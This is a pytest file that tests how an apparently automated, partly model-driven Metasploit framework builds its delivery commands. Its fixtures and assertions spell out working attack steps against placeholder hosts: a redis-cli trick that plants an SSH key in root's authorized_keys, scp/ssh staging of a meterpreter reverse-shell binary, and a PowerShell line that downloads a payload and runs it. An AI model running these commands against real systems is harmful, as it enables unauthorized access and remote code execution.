"""The acceptance basis for an execCode fact is what the session itself reported."""
import json
from pathlib import Path
from types import SimpleNamespace
import sys

import pytest

from agents.verifier import backstops  # noqa: E402

from runtime import delivery_commands  # noqa: E402

from agents.verifier import service  # noqa: E402

from orchestration import session_flow  # noqa: E402

from runtime import session_io  # noqa: E402

from runtime import session_registry  # noqa: E402

from runtime import sessions  # noqa: E402

from orchestration import positions  # noqa: E402
from tests.test_exec_confirmation import ROOT, HOST_MAP
for extra in (ROOT / "src", ROOT / "scripts"):
    if str(extra) not in sys.path:
        sys.path.insert(0, str(extra))

import run_plan
from tests.support import stub_callers
from runtime import session_identity, session_io, session_registry, sessions
from runtime import msfservice
from runtime import session_registry
from runtime import session_io
from runtime import session_identity
from runtime.runner import ExecOutcome


SPEC = {"driver": "msf",
        "payload": {"path": "linux/x64/meterpreter_reverse_tcp", "kind": "meterpreter",
                    "format": "elf"},
        "entry": {"driver": "ssh", "username": "root", "port": "22",
                  "authorize_command": "(echo; echo; cat {public_key_file}; echo) | "
                                       "redis-cli -h {target_host} -p {target_port} "
                                       "-x set agv_entry_key && "
                                       "redis-cli -h {target_host} -p {target_port} "
                                       "config set dir /root/.ssh && "
                                       "redis-cli -h {target_host} -p {target_port} "
                                       "config set dbfilename authorized_keys && "
                                       "redis-cli -h {target_host} -p {target_port} save"},
        "transport": "scp",
        "capabilities": {"capacity": {"max_bytes": 4096, "source": "fixture"},
                         "shell_ready": True}}


def declaration(**changes):
    spec = dict(SPEC, **changes)
    return delivery_commands.build_delivery_declaration(
        spec, control="192.0.2.128", target_host="192.0.2.10",
        materials_dir="/tmp/agv-materials", nonce="feedface", handler_port=1090,
        target_port="6379")


def test_a_declared_delivery_binds_the_runs_own_resources():
    """The card declares the capability; the port, the key, the stager and the line are ours."""
    built = declaration()
    assert built["resources"] == [{"host": "192.0.2.128", "port": 1090, "protocol": "tcp"}]
    assert set(built) == {"prepare", "cleanup", "resources", "expected", "capabilities",
                          "command", "handler", "materials", "authorize_command"}
    assert built["expected"] == {"session_host": "192.0.2.10", "type": "meterpreter",
                                 "tunnel_local": "192.0.2.128:1090"}
    assert built["handler"] == {"payload": "linux/x64/meterpreter_reverse_tcp",
                                "lhost": "192.0.2.128", "lport": 1090}
    assert built["materials"]["key_path"] == "/tmp/agv-materials/agv_feedface.key"
    assert built["materials"]["remote_stager"] == "/tmp/agv_feedface"


def test_the_authorization_command_is_handed_over_finished():
    """A nested-quote line is the runtime's plumbing, not the model's homework."""
    line = declaration()["authorize_command"]
    assert "{" not in line and "}" not in line
    assert line.startswith("(echo; echo; cat /tmp/agv-materials/agv_feedface.key.pub; echo) |")
    assert "-h 192.0.2.10 -p 6379 -x set agv_entry_key" in line
    assert line.endswith("config set dbfilename authorized_keys && "
                         "redis-cli -h 192.0.2.10 -p 6379 save")
    assert "\n" not in line
    assert declaration()["materials"]["authorize_command"] == line


def test_an_unbound_delivery_template_is_refused_by_name():
    """A template the runtime cannot bind does not travel as a broken command."""
    spec = dict(SPEC)
    spec["entry"] = dict(SPEC["entry"], authorize_command="do {something_unknown}")
    with pytest.raises(ValueError, match="SESSION_DELIVERY_TEMPLATE_UNBOUND"):
        delivery_commands.build_delivery_declaration(
            spec, control="192.0.2.128", target_host="192.0.2.10",
            materials_dir="/tmp/agv-materials", nonce="feedface", handler_port=1090,
            target_port="6379")


def test_the_delivery_line_stages_then_starts_without_target_side_tools():
    """No target-side download tool is assumed: the run's own entry stages the payload."""
    line = declaration()["command"]
    assert line.startswith("scp -i /tmp/agv-materials/agv_feedface.key")
    assert "root@192.0.2.10:/tmp/agv_feedface" in line
    assert "&& ssh -i /tmp/agv-materials/agv_feedface.key" in line
    assert line.rstrip().endswith("'chmod +x /tmp/agv_feedface; "
                                  "nohup /tmp/agv_feedface >/dev/null 2>&1 &'")
    assert "curl" not in line and "wget" not in line


def test_the_delivery_prepares_the_key_and_the_payload_on_the_control_box():
    """Preparation is recorded as ordinary control-side steps, so it is replayed or refused."""
    built = declaration()
    commands = [step["request"]["cmd"] for step in built["prepare"]]
    assert len(commands) == 2
    assert "ssh-keygen" in commands[0] and "/tmp/agv-materials/agv_feedface.key" in commands[0]
    assert "msfvenom" in commands[1] and "-o /tmp/agv-materials/agv_feedface.bin" in commands[1]
    assert all(step["platform"] == "linux" and step["binding"] is None
               for step in built["prepare"])
    assert "rm -f /tmp/agv-materials/agv_feedface.key" in built["cleanup"][0]["request"]["cmd"]


@pytest.mark.parametrize("changes,match", [
    ({"payload": None}, "SESSION_DELIVERY_SPEC_INVALID"),
    ({"payload": {"path": ""}}, "SESSION_DELIVERY_SPEC_INVALID"),
    ({"capabilities": None}, "SESSION_DELIVERY_CAPABILITIES_REQUIRED"),
    ({"transport": "http"}, "SESSION_DELIVERY_HTTP_INCOMPLETE"),
    ({"transport": "ftp"}, "SESSION_DELIVERY_SPEC_INVALID"),
])
def test_an_incomplete_delivery_declaration_is_refused_by_name(changes, match):
    """A missing declaration is refused by name instead of being filled in silently."""
    with pytest.raises(ValueError, match=match):
        declaration(**changes)
HTTP_SPEC = {"driver": "msf",
             "payload": {"path": "windows/x64/meterpreter/reverse_tcp",
                         "kind": "meterpreter", "format": "exe"},
             "transport": "http",
             "remote": {"dir": "C:\\Windows\\Temp", "suffix": ".exe"},
             "command": "powershell -NoProfile -Command \"IWR -Uri {fetch_url} "
                        "-OutFile {remote_path}; Start-Process {remote_path}\"",
             "capabilities": {"capacity": {"max_bytes": 4096, "source": "fixture"},
                              "shell_ready": True}}


def http_declaration(**changes):
    spec = dict(HTTP_SPEC, **changes)
    return delivery_commands.build_delivery_declaration(
        spec, control="192.0.2.128", target_host="192.0.2.30",
        materials_dir="/tmp/agv-materials", nonce="cafebabe", handler_port=1090,
        fetch_port=1091, target_port="8080")


def test_an_http_delivery_serves_the_stager_and_reserves_both_ports():
    """A target that fetches over http gets this run's address, port, name and service."""
    built = http_declaration()
    assert built["resources"] == [{"host": "192.0.2.128", "port": 1090, "protocol": "tcp"},
                                  {"host": "192.0.2.128", "port": 1091, "protocol": "tcp"}]
    assert built["expected"]["session_host"] == "192.0.2.30"
    serve = [step["request"]["cmd"] for step in built["prepare"]
             if "http.server" in step["request"]["cmd"]]
    assert len(serve) == 1 and "1091" in serve[0] and "$i" not in serve[0]
    assert "ss -lnt | grep -q ':1091 '" in serve[0]
    assert built["command"].startswith("powershell -NoProfile")
    assert "http://192.0.2.128:1091/agv_cafebabe.bin" in built["command"]
    assert "C:\\Windows\\Temp\\agv_cafebabe.exe" in built["command"]
    stopped = [step["request"]["cmd"] for step in built["cleanup"]
               if "http.pid" in step["request"]["cmd"]]
    assert stopped, "the fetch service has to be stopped by the cleanup"


def test_an_http_delivery_needs_a_command_and_a_fetch_port():
    """Half a route is refused by name instead of being invented."""
    with pytest.raises(ValueError, match="SESSION_DELIVERY_HTTP_INCOMPLETE"):
        http_declaration(command="")


def test_the_delivery_expects_the_host_named_by_the_exec_code_fact(monkeypatch):
    """A web-entry card names no target host, yet the graph still says where the session lands."""
    stub_callers(monkeypatch, "produced_exec_facts",
                        lambda document, node_id: [("pc1", "system")], callers=(positions, session_flow))
    assert session_flow.delivery_target_host(
        task={"inputs": {}}, document=object(), node_id="7", host_map=HOST_MAP) == "192.0.2.30"


def test_the_delivery_expectation_never_lands_empty():
    """Without a produced fact or a mapping, the node's own target address is still the answer."""
    assert session_flow.delivery_target_host(
        task={"inputs": {}}, document=None, node_id="7", host_map=HOST_MAP,
        scope={"host": "192.0.2.30", "port": 8080}) == "192.0.2.30"


def test_a_card_named_target_host_is_left_alone():
    """The card's own word wins where it has one."""
    assert session_flow.delivery_target_host(
        task={"inputs": {"target_host": "192.0.2.99"}}, document=None,
        node_id="7", host_map=HOST_MAP) == "192.0.2.99"
